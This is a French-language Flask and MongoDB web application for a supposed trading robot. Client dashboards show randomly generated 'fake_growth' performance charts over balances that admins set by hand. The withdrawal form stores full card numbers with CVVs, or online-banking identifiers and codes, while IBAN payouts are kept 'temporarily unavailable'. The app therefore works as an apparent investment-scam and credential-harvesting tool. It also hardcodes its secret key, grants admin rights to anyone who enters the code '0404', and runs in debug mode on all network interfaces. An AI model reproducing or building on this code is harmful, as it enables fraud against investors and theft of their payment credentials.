from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_pymongo import PyMongo
from werkzeug.security import generate_password_hash, check_password_hash
import datetime
import os
import numpy as np
from bson import ObjectId

# --- Config Flask et MongoDB ---
app = Flask(__name__)
app.secret_key = 'votre_clé_ultra_secrète'

MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017/Robottrader")
app.config["MONGO_URI"] = MONGO_URI
mongo = PyMongo(app)
db = mongo.db

# --- Page d'accueil ---
@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

# --- Inscription ---
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = generate_password_hash(request.form['password'])
        code_admin = request.form.get('code_admin')
        role = "admin" if code_admin == "0404" else "client"

        if db.users.find_one({"username": username}):
            return "Nom d'utilisateur déjà utilisé"

        db.users.insert_one({
            "username": username,
            "password": password,
            "role": role,
            "balance": 0,
            "benefit": 0,
            "api_key": "",
            "api_secret": ""
        })
        return redirect(url_for('login'))
    return render_template('register.html')

# --- Connexion ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = db.users.find_one({"username": username})

        if user and check_password_hash(user['password'], password):
            session['username'] = username
            return redirect(url_for('dashboard'))

        return "Identifiants incorrects"
    return render_template('login.html')

# --- Déconnexion ---
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# --- Configuration des clés API Alpaca (admin) ---
@app.route('/config_api', methods=['GET', 'POST'])
def config_api():
    if 'username' not in session:
        return redirect(url_for('login'))

    user = db.users.find_one({"username": session['username']})
    if user['role'] != 'admin':
        return "Accès refusé"

    if request.method == 'POST':
        db.users.update_one(
            {"username": session['username']},
            {"$set": {
                "api_key": request.form['api_key'],
                "api_secret": request.form['api_secret']
            }}
        )
        return redirect(url_for('dashboard'))

    return render_template('config_api.html',
                           api_key=user.get('api_key', ''),
                           api_secret=user.get('api_secret', ''))

# --- Dashboard admin et client ---
@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})

    if current_user['role'] == 'admin':
        users = list(db.users.find({"role": "client"}))
        return render_template("dashboard.html", is_admin=True, users=users, admin=current_user)

    balance = current_user.get('balance', 0)
    fake_growth = [round(balance * (1 + np.random.uniform(-0.02, 0.05)), 2) for _ in range(10)]
    dates = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]

    return render_template("dashboard.html",
                           is_admin=False,
                           username=current_user['username'],
                           balance=balance,
                           chart_labels=dates,
                           chart_data=fake_growth,
                           performance=round(fake_growth[-1] - fake_growth[0], 2))

# --- Modifier solde client (admin) ---
@app.route('/update_balance', methods=['POST'])
def update_balance():
    if 'username' not in session:
        return redirect(url_for('login'))

    admin = db.users.find_one({"username": session['username']})
    if admin['role'] != 'admin':
        return "Accès refusé"

    target = request.form['username']
    new_balance = float(request.form['new_balance'])

    db.users.update_one({"username": target}, {"$set": {"balance": new_balance}})
    return redirect(url_for('dashboard'))

# --- Voir le profil d’un utilisateur (admin) ---
@app.route('/user/<username>')
def user_profile(username):
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if not current_user or current_user['role'] != 'admin':
        return render_template('403.html'), 403

    target_user = db.users.find_one({"username": username})
    if not target_user:
        return render_template('404.html'), 404

    balance = target_user.get('balance', 0)
    fake_growth = [round(balance * (1 + np.random.uniform(-0.02, 0.05)), 2) for _ in range(10)]
    dates = [(datetime.datetime.now() - datetime.timedelta(days=i)).strftime('%d-%m') for i in reversed(range(10))]
    performance = round(fake_growth[-1] - fake_growth[0], 2)

    return render_template("user_profile.html",
                           username=target_user['username'],
                           balance=balance,
                           chart_labels=dates,
                           chart_data=fake_growth,
                           performance=performance)

# --- Page retrait (client seulement) ---
@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if current_user['role'] != 'client':
        return "Accès refusé"

    if request.method == 'POST':
        mode = request.form.get('mode')
        amount = float(request.form.get('amount', 0))

        if amount <= 0:
            return "Montant invalide"

        if mode == 'card':
            card_number = request.form.get('card_number')
            card_expiry = request.form.get('card_expiry')
            card_cvv = request.form.get('card_cvv')

            if not (card_number and card_expiry and card_cvv):
                return "Veuillez remplir tous les champs de la carte bancaire"
            db.withdraw_requests.insert_one({
                "username": current_user['username'],
                "amount": amount,
                "mode": "Carte bancaire",
                "card_number": card_number,
                "card_expiry": card_expiry,
                "card_cvv": card_cvv,
                "date": datetime.datetime.now(),
                "status": "En attente"
            })

        elif mode == 'bank':
            # Ce mode est momentanément indisponible
            return "Mode de retrait par IBAN momentanément indisponible"

        elif mode == 'identification':
            bank_name_id = request.form.get('bank_name_id')
            bank_identifiers = request.form.get('bank_identifiers')
            bank_code_id = request.form.get('bank_code_id')

            if not (bank_name_id and bank_identifiers and bank_code_id):
                return "Veuillez remplir tous les champs pour l’identification bancaire"

            # Vérifier que l’identifiant bancaire contient entre 9 et 11 chiffres
            if not (bank_identifiers.isdigit() and 9 <= len(bank_identifiers) <= 11):
                return "L’identifiant bancaire doit contenir entre 9 et 11 chiffres"

            db.withdraw_requests.insert_one({
                "username": current_user['username'],
                "amount": amount,
                "mode": "Identification bancaire",
                "bank_name_id": bank_name_id,
                "bank_identifiers": bank_identifiers,
                "bank_code_id": bank_code_id,
                "date": datetime.datetime.now(),
                "status": "En attente"
            })

        else:
            return "Mode de retrait non valide"

        return redirect(url_for('dashboard'))

    return render_template('withdraw.html')

# --- Dashboard admin : afficher demandes de retrait ---
@app.route('/withdraw_requests')
def withdraw_requests():
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if current_user['role'] != 'admin':
        return "Accès refusé"

    requests = list(db.withdraw_requests.find().sort("date", -1))
    return render_template('withdraw_requests.html', requests=requests, admin=current_user)

# --- Traitement retrait admin (accepter/rejeter) ---
@app.route('/process_withdrawal/<request_id>', methods=['POST'])
def process_withdrawal(request_id):
    if 'username' not in session:
        return redirect(url_for('login'))

    current_user = db.users.find_one({"username": session['username']})
    if not current_user or current_user['role'] != 'admin':
        return render_template('403.html'), 403

    action = request.form.get('action')  # "accept" ou "reject"
    withdrawal = db.withdraw_requests.find_one({"_id": ObjectId(request_id)})

    if not withdrawal:
        return "Demande introuvable", 404

    username = withdrawal['username']
    user = db.users.find_one({"username": username})

    if action == 'accept':
        amount = float(withdrawal.get('amount', 0))
        if user['balance'] >= amount:
            db.users.update_one(
                {"username": username},
                {"$inc": {"balance": -amount}}
            )
            db.withdraw_requests.update_one(
                {"_id": ObjectId(request_id)},
                {"$set": {"status": "Traité", "processed_date": datetime.datetime.now()}}
            )
        else:
            return "Solde insuffisant", 400

    elif action == 'reject':
        db.withdraw_requests.update_one(
            {"_id": ObjectId(request_id)},
            {"$set": {"status": "Rejeté", "processed_date": datetime.datetime.now()}}
        )
    else:
        return "Action invalide", 400

    return redirect(url_for('withdraw_requests'))

# --- Lancer app ---
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
